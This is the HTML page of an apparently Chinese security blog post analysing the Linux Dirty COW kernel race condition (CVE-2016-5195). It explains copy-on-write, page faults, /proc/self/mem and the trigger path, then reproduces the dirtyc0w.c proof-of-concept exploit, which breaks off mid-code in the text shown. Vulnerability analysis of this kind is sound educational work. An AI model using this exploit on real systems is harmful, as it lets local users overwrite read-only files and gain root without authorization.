@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="介绍漏洞编号：CVE-2016-5195 漏洞详情：Linux内核的内存子系统在处理写时拷贝（Copy-on-Write) 时存在条件竞争漏洞 产生影响：可以破坏私有只读内存映射，获取低权限的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取 root 权限。 前置知识条件竞争Race Condition，是指两个或多个进程或线程同时处理一个资源 (比如：全局变量、文件) 产生了非预期">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux高危漏洞Dirtycow复现">
+<meta property="og:url" content="http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="Xu4n">
+<meta property="og:description" content="介绍漏洞编号：CVE-2016-5195 漏洞详情：Linux内核的内存子系统在处理写时拷贝（Copy-on-Write) 时存在条件竞争漏洞 产生影响：可以破坏私有只读内存映射，获取低权限的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取 root 权限。 前置知识条件竞争Race Condition，是指两个或多个进程或线程同时处理一个资源 (比如：全局变量、文件) 产生了非预期">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651319895175690/f8107b99f5987084fbd18724daafa6f683cabc79.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651320033134982/e50598611ce40e0a5ea461d85c8e7068cf148594.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651325336706946/d26edeb2f385e18e64b3157978e6673222d7a3ad.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382699766968/cd3854460f2afe3f5eee863d1e3dbb75d85d9552.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382925127930/58a1fd21557e53a1c1beb45bd9fddc37fe0c2284.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383600681010/afd9fffd11019fe8206e419b0753be55a3fecc38.png">
+<meta property="og:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383664718195/2adf67315f755f8047b968a2996e849f8aaae471.png">
+<meta property="article:published_time" content="2022-04-27T08:19:13.000Z">
+<meta property="article:modified_time" content="2022-05-01T12:11:41.900Z">
+<meta property="article:author" content="Xu4n">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651319895175690/f8107b99f5987084fbd18724daafa6f683cabc79.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Linux高危漏洞Dirtycow复现</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">home</a></li><!--
+     --><!--
+       --><li><a href="/about/">about</a></li><!--
+     --><!--
+       --><li><a href="/archives/">articles</a></li><!--
+     --><!--
+       --><li><a href="/categories/">category</a></li><!--
+     --><!--
+       --><li><a href="/link/">link</a></li><!--
+     --><!--
+       --><li><a href="/search/">search</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/makabaka-yyds/makabaka-yyds.github.io">projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/05/09/glibc2-29%E4%BB%A5%E4%B8%8A%E7%9A%84off-by-null/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/04/22/Fuzzing101-exe6/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&text=Linux高危漏洞Dirtycow复现"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&is_video=false&description=Linux高危漏洞Dirtycow复现"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Linux高危漏洞Dirtycow复现&body=Check out this article: http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&title=Linux高危漏洞Dirtycow复现"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&name=Linux高危漏洞Dirtycow复现&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://makabaka-yyds.github.io/2022/04/27/Linux%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9EDirtycow%E5%A4%8D%E7%8E%B0/&t=Linux高危漏洞Dirtycow复现"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="toc-number">2.1.</span> <span class="toc-text">条件竞争</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Linux-%E5%86%99%E6%97%B6%E6%8B%B7%E8%B4%9D%E6%8A%80%E6%9C%AF-copy-on-write"><span class="toc-number">2.2.</span> <span class="toc-text">Linux 写时拷贝技术(copy-on-write)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A1%B5%E5%BC%8F%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">页式内存管理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%BA%E9%A1%B5%E4%B8%AD%E6%96%AD%E5%A4%84%E7%90%86"><span class="toc-number">2.4.</span> <span class="toc-text">缺页中断处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Page-cache"><span class="toc-number">2.5.</span> <span class="toc-text">Page cache</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.</span> <span class="toc-text">函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mmap"><span class="toc-number">2.6.1.</span> <span class="toc-text">mmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#madvice"><span class="toc-number">2.6.2.</span> <span class="toc-text">madvice</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#write"><span class="toc-number">2.6.3.</span> <span class="toc-text">write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#proc-self-mem"><span class="toc-number">2.6.4.</span> <span class="toc-text">&#x2F;proc&#x2F;self&#x2F;mem</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">触发原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC-%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">POC 代码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">5.</span> <span class="toc-text">源码及漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#step1"><span class="toc-number">5.1.</span> <span class="toc-text">step1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step2"><span class="toc-number">5.2.</span> <span class="toc-text">step2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#step3"><span class="toc-number">5.3.</span> <span class="toc-text">step3</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Linux高危漏洞Dirtycow复现
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Xu4n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-04-27T08:19:13.000Z" itemprop="datePublished">2022-04-27</time>
+        
+        (Updated: <time datetime="2022-05-01T12:11:41.900Z" itemprop="dateModified">2022-05-01</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Linux/">Linux</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Linux/" rel="tag">Linux</a>, <a class="tag-link-link" href="/tags/PWN/" rel="tag">PWN</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>漏洞编号：CVE-2016-5195</p>
+<p>漏洞详情：Linux内核的内存<strong>子系统</strong>在处理<strong>写时拷贝</strong>（Copy-on-Write) 时存在<strong>条件竞争</strong>漏洞</p>
+<p>产生影响：可以破坏私有只读内存映射，获取低权限的本地用户后，利用此漏洞获取其他只读内存映射的写权限，进一步获取 root 权限。</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>Race Condition，是指两个或多个进程或线程同时处理一个资源 (比如：全局变量、文件) 产生了非预期的效果，从而使程序执行流改变，进而达到攻击的目的。</p>
+<p>需要的条件：</p>
+<ol>
+<li>并发，即存在至少两个处于进行状态的执行流。</li>
+<li>共享对象，即多个并发流会访问同一对象。常见的有共享内存，文件系统，信号。</li>
+<li>改变对象，即至少有一个执行流会改变竞争对象的状态。因为如果程序只是对对象进行读操作，那么并不会产生条件竞争。</li>
+</ol>
+<p>所以当竞争的共享对象是内存中变量时，条件竞争可以算作内存破坏漏洞。分析条件竞争就是分析两个并发的线程/进程在不断的对共享对象做什么。</p>
+<h3 id="Linux-写时拷贝技术-copy-on-write"><a href="#Linux-写时拷贝技术-copy-on-write" class="headerlink" title="Linux 写时拷贝技术(copy-on-write)"></a>Linux 写时拷贝技术(copy-on-write)</h3><p>传统的 fork 函数会通过系统调用直接把所有的资源复制给新进程， 但这样效率低下。</p>
+<p>所以出于效率，Linux 引用了“写时拷贝”的技术，它可以<strong>推迟甚至免除拷贝数据</strong>。</p>
+<p>推迟：通过让父进程和子进程以<strong>只读</strong>的方式共享同一个拷贝，再在需要写入的时候父进程才给子进程复制数据。</p>
+<p>免除：fork 后立即调用exec()</p>
+<h3 id="页式内存管理"><a href="#页式内存管理" class="headerlink" title="页式内存管理"></a>页式内存管理</h3><p>把虚拟内存和物理内存都划分为长度大小固定的页，虚拟的内存只在逻辑上存在，物理的页（也称之为页框，页帧）真实的存在于内存条上，把虚拟内存页和真实的物理内存页的对应关系存储成一张表，就是页表，可以把页表想象成存放在内存中的一个大数组。当 CPU 进行寻址时，会将逻辑地址经过分段机制，变成线性地址，线性地址再通过分页机制，变成物理地址。</p>
+<h3 id="缺页中断处理"><a href="#缺页中断处理" class="headerlink" title="缺页中断处理"></a>缺页中断处理</h3><p>malloc() 和 mmap() 等内存分配函数，在分配时只是建立了<strong>进程虚拟地址空间</strong>，并没有分配虚拟内存对应的物理内存。当进程访问这些<strong>没有建立映射关系的虚拟内存</strong>时，处理器自动触发一个缺页异常。 </p>
+<p>具体一点说就是，因为物理内存是有限的，当一个程序执行时，会将暂时不需要的页面从物理页框换出到<strong>磁盘上</strong>。但是进程看到的自己的内存空间是完整的。所以当进程访问到一个逻辑页面时，操作系统去查页表，发现这个逻辑页面不在内存中，那么则会去磁盘上找到刚才换出的页面，重新加载到内存，然后修好页表，然后重新去用逻辑地址查找这个物理地址，这个过程就是缺页中断。不过这也只是缺页中断的其中一种情况。</p>
+<h3 id="Page-cache"><a href="#Page-cache" class="headerlink" title="Page cache"></a>Page cache</h3><p>页面缓存，内核会为每个文件单独维护一个 Page cache，是一段真正的物理内存，其中会保存用户进程访问过的该文件的内容，这些内容以页为单位保存在内存中。用户进程对于<strong>文件的大多数读写操作</strong>会直接作用到 Page cache 上，内核会选择在适当的时候将 Page cache 中的内容写到磁盘上（当然我们可以手工fsync控制回写），这样可以大大减少磁盘的访问次数，从而提高性能。</p>
+<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap</span><span class="params">(<span class="keyword">void</span> start, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags, <span class="keyword">int</span> fd, <span class="keyword">off_t</span> offsize)</span></span>;</span><br></pre></td></tr></table></figure>
+<p>这个函数的一个很重要的用处就是<strong>将磁盘上的文件映射到虚拟内存</strong>中，对于这个函数唯一要说的就是当 flags 的 <code>MAP_PRIVATE</code> 被置为 1 时，对 mmap 得到内存映射进行的<strong>写操作</strong>会使内核触发 COW 操作，写的是 COW 后的内存，不会同步到磁盘的文件中。</p>
+<h4 id="madvice"><a href="#madvice" class="headerlink" title="madvice"></a>madvice</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">madvice(<span class="keyword">caddr_t</span> addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> advice)</span><br></pre></td></tr></table></figure>
+<p>这个函数的主要用处是告诉内核内存 <code>addr~(addr+len)</code> 在接下来的使用状况，以便内核进行一些进一步的内存管理操作。当 advice 为 <code>MADV_DONTNEED</code> 时，此系统调用相当于通知内核 <code>addr~(addr+len)</code> 的内存在接下来不再使用，内核将释放掉这一块内存以节省空间，相应的页表项也会被置空。</p>
+<h4 id="write"><a href="#write" class="headerlink" title="write"></a>write</h4><p>向打开的文件描述符中，写相应的内容。</p>
+<h4 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="/proc/self/mem"></a>/proc/self/mem</h4><p>这个文件是一个<strong>指向当前进程的虚拟内存文件</strong>的文件，当前进程可以通过对这个文件进行读写以直接读写虚拟内存空间，并无视内存映射时的权限设置。也就是说我们可以利用写 /proc/self/mem 来改写不具有写权限的虚拟内存。可以这么做的原因是 /proc/self/mem 是一个文件，只要进程对该文件具有写权限，那就可以随便写这个文件了，只不过对这个文件进行读写的时候需要一遍访问内存地址所需要寻页的流程。因为这个文件指向的是虚拟内存。</p>
+<h2 id="触发原理"><a href="#触发原理" class="headerlink" title="触发原理"></a>触发原理</h2><p>当调用 write 向 <code>/proc/self/mem</code> 文件写数据时，进入内核态后，内核会调用 <strong>get_user_pages</strong> 函数获取要写入的内存地址。</p>
+<ol>
+<li><p><strong>get_user_pages **会调用 **follow_page_mask</strong> 来获取这块内存的页表项，并同时要求页表项所指向的内存映射具有<strong>可写</strong>的权限。第一次获取内存的页表项会因为缺页而失败。</p>
+</li>
+<li><p>接着 <strong>get_user_page</strong> 调用 <strong>faultin_page</strong> 进行缺页处理后第二次调用 <strong>follow_page_mask</strong> 获取这块内存的页表项，如果需要获取的页表项指向的是一个只读的映射，那第二次获取也会失败。</p>
+</li>
+<li><p>这时候 <strong>get_user_pages **函数会第三次调用 **follow_page_mask</strong> 来获取该内存的页表项，并且<strong>不再要求页表项所指向的内存映射具有可写的权限</strong>，这时是可以成功获取的，获取成功后内核会对这个<strong>只读的内存进行强制的写入操作</strong>。</p>
+</li>
+</ol>
+<p>整个过程说白了就是，对 **/proc/self/mem **进行写操作时， 在第三次读取页表项时会无视权限强行写入。就算是文件映射到虚拟内存中，也不会出现越权写：</p>
+<ul>
+<li>如果写入的虚拟内存是一个 <code>VM_PRIVATE</code> 的映射，那在<strong>缺页</strong>的时候内核就会执行 COW 操作产生一个副本来进行写入，写入的内容是不会同步到文件中的</li>
+<li>如果写入的虚拟内存是一个 <code>VM_SHARE</code> 的映射，那 mmap 能够映射成功的充要条件就是进程拥有对该文件的写权限，这样写入的内容同步到文件中也不算越权了。</li>
+</ul>
+<p>到这本身时没什么问题的，但是，如果我们在<strong>第二次获取页表项失败后</strong>，让另一个线程调用 <code>madvice(addr,addrlen, MADV_DONTNEED)</code> ，其中<code>addr~addr+addrlen</code> 是一个只读文件的 <code>VM_PRIVATE</code> 的只读内存映射，那该映射的页表项会被置空。这时如果 <strong>get_user_pages</strong> 函数第三次调用 <strong>follow_page_mask</strong> 来获取该内存的页表项。由于这次调用不再要求该内存映射具有写权限，所以在缺页处理的时候内核也不再会执行 COW 操作产生一个副本以供写入。所以缺页处理完成后第四次调用 <strong>follow_page_mask</strong> 获取这块内存的页表项的时候，不仅可以成功获取，而且获取之后强制的写入的内容也会同步到映射的只读文件中。从而导致了只读文件的越权写。</p>
+<h2 id="POC-代码分析"><a href="#POC-代码分析" class="headerlink" title="POC 代码分析"></a>POC 代码分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">$ sudo -s</span></span><br><span class="line"><span class="comment"># echo this is not a test &gt; foo</span></span><br><span class="line"><span class="comment"># chmod 0404 foo</span></span><br><span class="line"><span class="comment">$ ls -lah foo</span></span><br><span class="line"><span class="comment">-r-----r-- 1 root root 19 Oct 20 15:23 foo</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">this is not a test</span></span><br><span class="line"><span class="comment">$ gcc -pthread dirtyc0w.c -o dirtyc0w</span></span><br><span class="line"><span class="comment">$ ./dirtyc0w foo m00000000000000000</span></span><br><span class="line"><span class="comment">mmap 56123000</span></span><br><span class="line"><span class="comment">madvise 0</span></span><br><span class="line"><span class="comment">procselfmem 1800000000</span></span><br><span class="line"><span class="comment">$ cat foo</span></span><br><span class="line"><span class="comment">m00000000000000000</span></span><br><span class="line"><span class="comment">####################### dirtyc0w.c #######################</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="keyword">int</span> f;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">st</span>;</span></span><br><span class="line"><span class="keyword">char</span> *name;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">madviseThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    c+=madvise(<span class="built_in">map</span>,<span class="number">100</span>,MADV_DONTNEED);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;madvise %d\n\n&quot;</span>,c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">procselfmemThread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *str;</span><br><span class="line">  str=(<span class="keyword">char</span>*)arg;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> f=open(<span class="string">&quot;/proc/self/mem&quot;</span>,O_RDWR);</span><br><span class="line">  <span class="keyword">int</span> i,c=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">100000000</span>;i++) &#123;</span><br><span class="line"></span><br><span class="line">    lseek(f,(<span class="keyword">uintptr_t</span>) <span class="built_in">map</span>,SEEK_SET);</span><br><span class="line">    c+=write(f,str,<span class="built_in">strlen</span>(str));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;procselfmem %d\n\n&quot;</span>, c);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (argc&lt;<span class="number">3</span>) &#123;</span><br><span class="line">  (<span class="keyword">void</span>)<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>,</span><br><span class="line">      <span class="string">&quot;usage: dirtyc0w target_file new_content&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>; &#125;</span><br><span class="line">  <span class="keyword">pthread_t</span> pth1,pth2;</span><br><span class="line"></span><br><span class="line">  f=open(argv[<span class="number">1</span>],O_RDONLY);</span><br><span class="line">  fstat(f,&amp;st);</span><br><span class="line">  name=argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">map</span>=mmap(<span class="literal">NULL</span>,st.st_size,PROT_READ,MAP_PRIVATE,f,<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span 